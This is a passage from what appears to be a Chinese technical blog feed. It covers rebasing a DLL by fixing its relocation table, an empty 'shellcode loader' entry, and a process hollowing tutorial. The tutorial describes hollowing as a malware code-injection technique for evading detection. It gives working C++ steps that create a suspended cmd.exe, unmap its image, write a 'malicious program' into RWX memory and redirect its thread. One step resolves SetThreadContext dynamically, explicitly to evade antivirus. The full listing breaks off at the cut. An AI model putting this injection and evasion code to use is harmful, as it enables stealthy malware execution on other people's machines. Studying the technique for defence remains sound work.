info"><p><strong></strong></p><p>重定位表的修复原理与IAT修复完全一致，我们需要分别读入脱壳前与脱壳后的两个程序，接着通过循环正确的重定位表信息，并依次覆盖到脱壳后的程序内，以此实现对重定位表的修复功能;</p></div><h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Modify_ImageBase_Demo.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="keyword">auto</span> FilePath_SRC = <span class="string">&quot;xxx\\Dll1.dll&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="keyword">auto</span> FilePath_DEST = <span class="string">&quot;xxx\\Dll1_Demo.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RVA2FOA</span><span class="params">(DWORD dwRVA, LPVOID lpBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpBuffer;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)pDos);</span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line">    <span class="keyword">if</span> (dwRVA &lt; pSec[<span class="number">0</span>].VirtualAddress)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> dwRVA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (dwRVA &gt;= pSec[i].VirtualAddress &amp;&amp; dwRVA &lt;= pSec[i].VirtualAddress + pSec[i].Misc.VirtualSize)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> dwRVA - pSec[i].VirtualAddress + pSec[i].PointerToRawData;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dwRVA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileA</span>(</span><br><span class="line">        (LPSTR)FilePath_SRC,</span><br><span class="line">        GENERIC_READ,</span><br><span class="line">        FILE_SHARE_READ,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        OPEN_EXISTING,</span><br><span class="line">        FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;dwFileSize: %d\n&quot;</span>, dwFileSize);</span><br><span class="line">    LPVOID lpData = <span class="keyword">new</span> BYTE[dwFileSize];</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == lpData)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;申请内存失败\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD lpNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpData, dwFileSize, &amp;lpNumberOfBytesRead, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;lpData: %x\n&quot;</span>, *(<span class="type">short</span>*)lpData);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//解析PE</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpData;</span><br><span class="line">    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + (DWORD)lpData);</span><br><span class="line">     <span class="comment">//定位重定位位置</span></span><br><span class="line">    PIMAGE_DATA_DIRECTORY pDataDir = (PIMAGE_DATA_DIRECTORY)(pNt-&gt;OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_BASERELOC);</span><br><span class="line">     <span class="comment">//获取重定位表</span></span><br><span class="line">    PIMAGE_BASE_RELOCATION pLoc = (PIMAGE_BASE_RELOCATION)(<span class="built_in">RVA2FOA</span>(pDataDir-&gt;VirtualAddress, lpData) + (DWORD)lpData);</span><br><span class="line"></span><br><span class="line">     <span class="comment">//判断是否有重定位表, 数据目录表不存在时, VirtualAddress为0, 也就是指向映像基址</span></span><br><span class="line">    <span class="keyword">if</span> ((LPVOID)pLoc == lpData)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//循环重定位表, 重定位表VirtualAddress和SizeOfBlock都为0表示重定位表结束</span></span><br><span class="line">    <span class="keyword">while</span> ((pLoc-&gt;VirtualAddress + pLoc-&gt;SizeOfBlock) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">         <span class="comment">//重定位数据, 位于IMAGE_BASE_RELOCATION表开头8字节之后</span></span><br><span class="line">        PWORD pLocData = (PWORD)((PBYTE)pLoc + <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line">         <span class="comment">//计算本节需要修正的重定位项（地址）的数目, 每个数据都是16字节（4+12字节, 高4位表示重定位类型, 低12位为RVA）</span></span><br><span class="line">         <span class="comment">//SizeOfBlock的值包括了SizeOfBlock和VirtualAddress的大小, 8字节需要减去</span></span><br><span class="line">        DWORD dwNumOfpLoc = (pLoc-&gt;SizeOfBlock - <span class="built_in">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="built_in">sizeof</span>(WORD);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; dwNumOfpLoc; i++)</span><br><span class="line">        &#123;</span><br><span class="line">             <span class="comment">//高位为3表示有效重定位</span></span><br><span class="line">            <span class="keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="number">0x0000F000</span>) == <span class="number">0x00003000</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="comment">/*需要修正的数据</span></span><br><span class="line"><span class="comment">                 修正重定位数据, 重定位表记录的是存在硬编码的地址, 以基址+偏移的形式</span></span><br><span class="line"><span class="comment">                 存在硬编码的地址 = 重定位基址 + 重定位表数据偏移</span></span><br><span class="line"><span class="comment">                      = 基址 + 重定位地址 + 重定位数据（数据后12位）*/</span></span><br><span class="line">                PDWORD pAddress = (PDWORD)((PBYTE)pDos + <span class="built_in">RVA2FOA</span>(pLoc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="number">0x0FFF</span>), lpData));</span><br><span class="line">                 <span class="comment">//重定位地址 = 硬编码地址 - ImageBase + 实际基地址</span></span><br><span class="line">                 <span class="comment">//           = 实际基地址 - ImageBase + 硬编码地址</span></span><br><span class="line">                *pAddress = *pAddress - pNt-&gt;OptionalHeader.ImageBase + <span class="number">0x1500000</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         <span class="comment">//循环下一个重定位区段</span></span><br><span class="line">        pLoc = (PIMAGE_BASE_RELOCATION)((PBYTE)pLoc + pLoc-&gt;SizeOfBlock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//修改ImageBase</span></span><br><span class="line">    pNt-&gt;OptionalHeader.ImageBase = <span class="number">0x1500000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开新文件</span></span><br><span class="line">    HANDLE hNewFile = <span class="built_in">CreateFileA</span>(FilePath_DEST, GENERIC_WRITE, <span class="literal">NULL</span>, <span class="literal">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (INVALID_HANDLE_VALUE == hNewFile)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;CreateFileA Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DWORD lpNumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FALSE == <span class="built_in">WriteFile</span>(hNewFile, lpData, dwFileSize, &amp;lpNumberOfBytesWritten, <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WriteFile Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">CloseHandle</span>(hNewFile);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WriteFile Success\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*MyShowMessage)</span><span class="params">()</span></span>;</span><br><span class="line">    HMODULE hDll = <span class="built_in">LoadLibraryA</span>(FilePath_DEST);</span><br><span class="line">    <span class="keyword">if</span> (hDll == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;LoadLibraryA Failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    MyShowMessage myShowMessage = (MyShowMessage)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;ShowMessage&quot;</span>);</span><br><span class="line">    <span class="built_in">myShowMessage</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行成功-1"><a href="#运行成功-1" class="headerlink" title="运行成功"></a>运行成功</h3><p><img src="https://raw.githubusercontent.com/Dooookey/Photos/main/202407021717655.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/Dooookey/Photos/main/202407021717655.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="重建重定位表"></p>]]></content>
      
      
      <categories>
          
          <category> Windows PE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ShellCode加载器</title>
      <link href="/3cf1e5d0.html"/>
      <url>/3cf1e5d0.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>ShellCode加载器</strong></p></div><span id="more"></span>]]></content>
      
      
      <categories>
          
          <category> Windows </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程镂空(傀儡进程)</title>
      <link href="/efa87f6d.html"/>
      <url>/efa87f6d.html</url>
      
        <content type="html"><![CDATA[<div class="note info"><p><strong>进程镂空(傀儡进程)</strong></p><p>进程镂空(Process Hollowing), 又称<code>傀儡进程</code>, 是一种恶意软件(malware)利用的代码注入技术。它主要用于恶意代码注入到合法进程中, 以规避安全检测、提高恶意代码执行的隐蔽性和稳定性;</p></div><span id="more"></span><h2 id="x32位实现思路"><a href="#x32位实现思路" class="headerlink" title="x32位实现思路"></a>x32位实现思路</h2><h3 id="创建挂起进程"><a href="#创建挂起进程" class="headerlink" title="创建挂起进程"></a>创建挂起进程</h3><blockquote><p>以挂起的形式创建一个新的目标进程(以cmd.exe为例), 使用<code>CreatePorcessA</code>函数时需设置dwCreationFlags为<code>CREATE_SUSPENDED</code>;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">STARTUPINFOA lpStartupInfo = &#123;&#125;;</span><br><span class="line">lpStartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOA);</span><br><span class="line">PROCESS_INFORMATION pi = &#123;&#125;;</span><br><span class="line"><span class="comment">// 以挂起的形式启动一个进程</span></span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">CreateProcessA</span>(</span><br><span class="line">    <span class="literal">NULL</span>, </span><br><span class="line">    (LPSTR)<span class="string">&quot;cmd&quot;</span>, </span><br><span class="line">    <span class="literal">NULL</span>, </span><br><span class="line">    <span class="literal">NULL</span>, </span><br><span class="line">    FALSE, </span><br><span class="line">    CREATE_SUSPENDED, </span><br><span class="line">    <span class="literal">NULL</span>, </span><br><span class="line">    <span class="literal">NULL</span>, </span><br><span class="line">    &amp;lpStartupInfo, </span><br><span class="line">    &amp;pi</span><br><span class="line">))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将恶意程序加载到内存"><a href="#将恶意程序加载到内存" class="headerlink" title="将恶意程序加载到内存"></a>将恶意程序加载到内存</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(szTARGETFILE, GENERIC_READ, <span class="literal">NULL</span>, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hFile == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;CreateFile Failed.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line">LPVOID lpBuffer = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, dwFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">DWORD dwReadLenth = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">ReadFile</span>(hFile, lpBuffer, dwFileSize, &amp;dwReadLenth, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ReadFile Failed,\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hFile);</span><br></pre></td></tr></table></figure><h3 id="获取挂起进程上下文以及映像基址"><a href="#获取挂起进程上下文以及映像基址" class="headerlink" title="获取挂起进程上下文以及映像基址"></a>获取挂起进程上下文以及映像基址</h3><blockquote><p>通过<code>ctx.Ebx+8</code>可以获取傀儡进程的ImageBase地址，因为<code>ctx.Ebx</code>包含PEB地址，而PEB的ImageBaseAddress字段位于PEB的偏移量<code>0x8</code>处</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取上下文</span></span><br><span class="line">CONTEXT ctx = &#123;&#125;;</span><br><span class="line">ctx.ContextFlags = CONTEXT_ALL;</span><br><span class="line"><span class="built_in">GetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">LPVOID lpImageBase = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">ReadProcessMemory</span>(pi.hProcess, (LPVOID)(ctx.Ebx + <span class="number">8</span>), &amp;lpImageBase, <span class="built_in">sizeof</span>(PVOID), <span class="literal">NULL</span>); <span class="comment">// ctx.Ebx = PEB, ctx.Ebx + 8 = PEB.ImageBase</span></span><br></pre></td></tr></table></figure><h3 id="卸载挂起进程内存"><a href="#卸载挂起进程内存" class="headerlink" title="卸载挂起进程内存"></a>卸载挂起进程内存</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((DWORD)lpImageBase == pNt-&gt;OptionalHeader.ImageBase)</span><br><span class="line">&#123;</span><br><span class="line">    FnNtUnmapViewOfSection NtUnmapViewOfSection = (FnNtUnmapViewOfSection)<span class="built_in">GetProcAddress</span>(<span class="built_in">LoadLibrary</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtUnmapViewOfSection&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (NtUnmapViewOfSection == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;NtUnmapViewOfSection GetProcAddress Failed.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">NtUnmapViewOfSection</span>(pi.hProcess, lpImageBase);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="将恶意程序内容写入目标进程"><a href="#将恶意程序内容写入目标进程" class="headerlink" title="将恶意程序内容写入目标进程"></a>将恶意程序内容写入目标进程</h3><blockquote><p>申请可读可写可执行内存, 将恶意程序头部写入内存, 然后循环将区段写入;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">LPVOID lpTargetMemory = <span class="built_in">VirtualAllocEx</span>(pi.hProcess, (PVOID)pNt-&gt;OptionalHeader.ImageBase, pNt-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"><span class="keyword">if</span> (lpTargetMemory == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;VirtualAllocEx Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FALSE == <span class="built_in">WriteProcessMemory</span>(pi.hProcess, lpTargetMemory, lpBuffer, pNt-&gt;OptionalHeader.SizeOfHeaders, <span class="literal">NULL</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;WritePrcessMemory PE Header Failed.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">    PIMAGE_SECTION_HEADER pSec = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pDos-&gt;e_lfanew + <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS) + (<span class="built_in">sizeof</span>(IMAGE_SECTION_HEADER) * i));</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(pi.hProcess, ((LPBYTE)lpTargetMemory + pSec-&gt;VirtualAddress), ((LPBYTE)lpBuffer + pSec-&gt;PointerToRawData), pSec-&gt;SizeOfRawData, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="更新目标进程的线程上下文"><a href="#更新目标进程的线程上下文" class="headerlink" title="更新目标进程的线程上下文"></a>更新目标进程的线程上下文</h3><blockquote><p>将EntryPoint地址写入<code>ctx.Eax</code>是为了让目标进程在恢复执行时，从特定的地址（EntryPoint）开始运行; <code>ctx.Ebx + sizeof(DWORD) * 2</code>相当于<code>ctx.Ebx + 0x8</code>; 同样是将新的ImageBase写入到PEB偏移<code>0x8</code>处, 也就是ImageBaseAddress字段;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx.Eax = (DWORD)((LPBYTE)lpTargetMemory + pNt-&gt;OptionalHeader.AddressOfEntryPoint);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(pi.hProcess, (LPVOID)(ctx.Ebx + <span class="built_in">sizeof</span>(DWORD) * <span class="number">2</span>), &amp;pNt-&gt;OptionalHeader.ImageBase, <span class="built_in">sizeof</span>(LPVOID), <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><h3 id="恢复目标进程主线程"><a href="#恢复目标进程主线程" class="headerlink" title="恢复目标进程主线程"></a>恢复目标进程主线程</h3><blockquote><p>使用动态获取SetThreadContext函数并调用, 规避一下杀软; 恢复主线程并关闭句柄;</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SetThreadContext(pi.hThread, &amp;ctx);</span></span><br><span class="line">MySetThreadContext mySetThreadContext = (MySetThreadContext)<span class="built_in">DynamicCall</span>();</span><br><span class="line"><span class="keyword">if</span> (mySetThreadContext == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;DynamicCall Failed\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">mySetThreadContext</span>(pi.hThread, &amp;ctx);</span><br><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread);</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(pi.hThread);</span><br></pre></td></tr></table></figure><h2 id="x32位完整代码"><a href="#x32位完整代码" class="headerlink" title="x32位完整代码"></a>x32位完整代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 